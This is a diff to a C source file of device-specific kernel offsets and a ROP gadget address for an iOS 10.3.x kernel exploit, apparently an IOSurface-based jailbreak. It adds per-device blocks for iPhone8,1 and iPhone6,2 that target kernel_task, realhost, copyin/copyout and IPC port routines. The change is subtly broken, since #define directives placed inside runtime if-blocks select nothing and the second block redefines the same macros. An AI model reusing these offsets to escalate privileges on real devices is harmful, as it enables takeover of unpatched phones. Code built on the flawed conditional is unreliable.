@@ -37,35 +37,38 @@
 #define OFFSET_IOUSERCLIENT_IPC                     0x9c
 #define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
 
-//offsets are for iPhone 6s 10.3.2
-
-#define OFFSET_ZONE_MAP                             0xfffffff007548478 /* "zone_init: kmem_suballoc failed" */
+if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM_S8000") == 0) //iPhone8,1 iOS 10.3.2
+{
+#define OFFSET_ZONE_MAP                             0xfffffff007548478
 #define OFFSET_KERNEL_MAP                           0xfffffff0075a4050
 #define OFFSET_KERNEL_TASK                          0xfffffff0075a4048
-#define OFFSET_REALHOST                             0xfffffff00752aba0 /* host_priv_self */
+#define OFFSET_REALHOST                             0xfffffff00752aba0
 #define OFFSET_BZERO                                0xfffffff007081f80
 #define OFFSET_BCOPY                                0xfffffff007081dc0
 #define OFFSET_COPYIN                               0xfffffff0071806f4
 #define OFFSET_COPYOUT                              0xfffffff0071808e8
-#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94 /* convert_task_suspension_token_to_port */
-#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c /* convert_task_suspension_token_to_port */
-#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8 /* "ipc_host_init" */
+#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94
+#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c
+#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8
 #define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8
 #define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff0064b1398
-
-//#define OFFSET_ZONE_MAP                             0xfffffff007558478 /* "zone_init: kmem_suballoc failed" */
-//#define OFFSET_KERNEL_MAP                           0xfffffff0075b4050
-//#define OFFSET_KERNEL_TASK                          0xfffffff0075b4048
-//#define OFFSET_REALHOST                             0xfffffff00753aba0 /* host_priv_self */
-//#define OFFSET_BZERO                                0xfffffff00708df80
-//#define OFFSET_BCOPY                                0xfffffff00708ddc0
-//#define OFFSET_COPYIN                               0xfffffff00718d028
-//#define OFFSET_COPYOUT                              0xfffffff00718d21c
-//#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff0070a60b4 /* convert_task_suspension_token_to_port */
-//#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070b938c /* convert_task_suspension_token_to_port */
-//#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070a5bd8 /* "ipc_host_init" */
-//#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006ef2d78
-//#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff00651a174
+}
+if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7\/RELEASE_ARM64_S5L8960X") == 0) //iPhone6,2(and iPhone6,1 I think) iOS 10.3.1
+{
+#define OFFSET_ZONE_MAP                             0xfffffff00754c478
+#define OFFSET_KERNEL_MAP                           0xfffffff0075a8050
+#define OFFSET_KERNEL_TASK                          0xfffffff0075a8048
+#define OFFSET_REALHOST                             0xfffffff00752eba0
+#define OFFSET_BZERO                                0xfffffff007081f80
+#define OFFSET_BCOPY                                0xfffffff007081dc0
+#define OFFSET_COPYIN                               0xfffffff007181218
+#define OFFSET_COPYOUT                              0xfffffff00718140c
+#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099f7c
+#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad1d4
+#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff007099aa0
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006f25538
+#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff006525174
+}
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
